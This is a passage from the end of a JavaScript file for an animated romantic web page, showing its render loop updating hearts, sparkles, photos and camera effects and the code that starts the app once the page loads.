            if (this.photosManager) this.photosManager.update(elapsedTime, delta);
            this.floatingHearts.update(elapsedTime, delta);
            this.floatingTexts.update(elapsedTime, delta);
            this.sparkles.update(elapsedTime);
            this.explosionManager.update(delta);

            this.cameraAnim.update(elapsedTime, delta, this.introAnim.isFinished);

            if (this.composer) {
                this.composer.render();
            } else {
                this.renderer.render(this.scene, this.camera);
            }
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => { window.loveApp = new LoveExperienceApp(); });
    } else {
        window.loveApp = new LoveExperienceApp();
    }
})();
